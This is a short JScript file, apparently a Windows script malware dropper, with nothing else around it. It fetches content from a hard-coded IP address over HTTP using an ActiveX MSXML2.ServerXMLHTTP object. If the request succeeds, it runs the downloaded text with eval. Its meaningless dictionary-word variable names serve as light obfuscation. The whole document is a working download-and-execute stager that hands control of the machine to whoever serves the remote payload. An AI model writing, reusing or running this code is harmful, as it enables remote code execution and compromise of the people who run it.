  var enswathing = "http://38.247.161.228/8Xg122IK";
  
  var Dorking = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
  
  Dorking.open("GET", enswathing, false);
  
  Dorking.send();
  
  var masterplan = Dorking.status;
  var nonuniquenesses = Dorking.getAllResponseHeaders();
  var undecrypted = Dorking.responseText;
  
  if (undecrypted && undecrypted.length > 0 && masterplan === 200) {
      eval(undecrypted);
  }